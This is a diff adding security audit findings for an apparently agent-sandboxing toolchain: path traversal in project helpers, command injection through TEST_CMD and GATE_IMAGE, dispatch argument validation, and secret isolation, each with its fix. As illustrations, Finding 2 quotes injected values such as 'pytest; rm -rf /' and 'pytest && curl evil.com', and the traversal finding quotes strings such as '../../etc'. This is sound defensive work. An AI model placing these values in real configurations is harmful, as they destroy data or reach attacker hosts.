@@ -123,7 +123,6 @@ This document records security audit findings, threat modeling, abuse scenarios,
 - **Abuse Scenario**: If untrusted input identifiers were concatenated into shell commands or filesystem paths prior to validation, an attacker could achieve arbitrary command execution or path traversal.
 - **Fix / Status**: No exploitable issue found. All identifiers (`TASK_ID`, `GOAL_ID`, `DOC_NAME`, `HOST`, `TARGET`, along with project, action, worker, and duration arguments) are strictly validated against anchored regular expressions (`.fullmatch()`) or explicit whitelists before concatenation. Dynamic command arguments use `shlex.quote()`, and owner content is transmitted via standard input (`inp`).
 
-
 ## bin/lib/foreman/knowledge.py
 
 ### Threat Model
@@ -240,3 +239,35 @@ This document records security audit findings, threat modeling, abuse scenarios,
 - **Location**: `scripts/install.sh`, `scripts/vm-baseline-ubuntu.sh`
 - **Abuse Scenario**: Installer scripts often display or log generated credentials (such as database passwords, initial admin tokens, or API keys). If written to stdout, these secrets can be captured in terminal scrollback, CI artifacts, or cloud-init log files (`/home/forge/agent-forge/install.log` or `/var/log/cloud-init-output.log`), which may be readable by unauthorized users or monitoring tools.
 - **Fix / Status**: Confirmed that neither script prints passwords or tokens to stdout or stderr. Generated Forgejo passwords and access tokens are written directly to mode `0600` secret files by `scripts/forge-bootstrap` and referenced only by path. `scripts/install.sh` and `scripts/vm-baseline-ubuntu.sh` output status indications without secret interpolation. Static analysis checks verify that neither script contains commands echoing or printing sensitive credentials.
+
+## bin/lib/sbx.py + bin/dispatch
+
+### Finding 1: Path Traversal in Project and ID Helpers
+- **Severity**: HIGH
+- **Location**: `bin/lib/sbx.py:ks_path`, `project_conf`, `project_pool`, `ledger_path`, `run_path`, `secret_path`
+- **Abuse Scenario**: Unvalidated project names containing directory traversal sequences (such as `../../etc`, `../KILLSWITCH`, or path separators) could be passed to `ks_path()`, `project_conf()`, or `project_pool()`. An attacker or compromised goal configuration could access or manipulate files outside the intended project/runs directory hierarchy, potentially triggering kill switches at unintended filesystem locations or reading unauthorized configuration files.
+- **Fix**: Added `_check_project()` validation enforcing `PROJECT_RE` (`^[a-z0-9][a-z0-9-]{0,39}$`) and rejecting `..`, `/`, and `\` across all project path helpers (`ks_path`, `project_conf`, `project_pool`, `ledger_path`). Added dedicated path helpers `run_path(run_id)`, `run_dir(run_id)`, and `secret_path(name)` validating IDs against `RUN_ID_RE` / `SECRET_NAME_RE` and strictly rejecting path traversal sequences.
+
+### Finding 2: Unvalidated Configuration Execution in `TEST_CMD` and `GATE_IMAGE`
+- **Severity**: HIGH
+- **Location**: `bin/lib/sbx.py:test_cmd`, `gate_image`
+- **Abuse Scenario**: Projects define custom `TEST_CMD` and `GATE_IMAGE` settings in `project.conf` that are executed inside gate and maintenance containers via `/bin/sh -c <cmd>`. Previously, when a configuration supplied a malicious command or image containing shell metacharacters (e.g. `pytest; rm -rf /`, `pytest && curl evil.com`, `worker:1; rm -rf /`), `test_cmd()` and `gate_image()` silently fell back to defaults instead of failing closed, masking malicious configuration attempts or risking execution if fallback logic changed.
+- **Fix**: Modified `test_cmd()` and `gate_image()` to validate non-empty values against `TEST_CMD_RE` and `IMAGE_RE`. If a configured command or image fails regex validation, the functions immediately raise `ValueError` (fail closed), preventing any execution of unvalidated commands.
+
+### Finding 3: Missing Argument and Option Validation in `bin/dispatch`
+- **Severity**: MEDIUM
+- **Location**: `bin/dispatch:main`, `_opt`, `preflight`, `container_running`
+- **Abuse Scenario**: `bin/dispatch` accepted worker arguments and optional environment flags (`DISPATCH_MODEL`, `DISPATCH_ROLE`, `DISPATCH_BRANCH`). When invoked with `--check <worker>`, the worker argument was passed directly to `container_running()` and `docker inspect` without regex validation, risking command-line option injection if arbitrary strings were supplied. In addition, malformed `DISPATCH_MODEL` or `DISPATCH_ROLE` values were silently ignored rather than actively refused.
+- **Fix**: Validated worker arguments against `WORKER_RE` (`worker-\d+`) at entry in both `--check` mode and standard dispatch mode. Updated `_opt()` to validate environment variables against specific regexes (`MODEL_RE`, `ROLE_RE`, `SAFE_ARG`), refusing execution with exit code 3 if invalid values are supplied before any container inspection or limits locking occurs.
+
+### Finding 4: Secrets Isolation in Argv and Environment Variables
+- **Severity**: LOW (Audited & Confirmed Safe)
+- **Location**: `bin/lib/sbx.py:SECRETS`, `worker/af-agent`, `worker/docker-compose.api.yml`
+- **Abuse Scenario**: If API keys, tokens, or credentials from `~/.config/sandbox/secrets` were passed as command-line arguments in `subprocess` / `docker exec` argv or logged to disk, they could be leaked via process inspection (`/proc/*/cmdline`) or run artifacts.
+- **Fix / Status**: Verified that credentials are never passed in argv elements or logged environment variables. API keys and tokens are mounted exclusively as read-only files (`/run/secrets/api-key:ro`, `/run/secrets/forgejo-token:ro`), and prompts are transmitted via stdin (`cat > "$prompt"`), guaranteeing that secrets remain isolated to the container runtime environment.
+
+### Finding 5: Elimination of Shell String Concatenation and `shell=True`
+- **Severity**: LOW (Audited & Confirmed Safe)
+- **Location**: `bin/lib/sbx.py`, `bin/dispatch`
+- **Abuse Scenario**: Using `shell=True` or joining command strings with spaces before passing them to a shell allows metacharacters in arguments (such as prompts or branch names) to break out into arbitrary command execution.
+- **Fix / Status**: Verified that neither `sbx.py` nor `bin/dispatch` uses `shell=True` or shell string concatenation. All commands are passed strictly as lists (`argv`) to `subprocess.run` and `subprocess.Popen`. Added `sbx.sh(*args, **kw)` helper to enforce list-based execution.
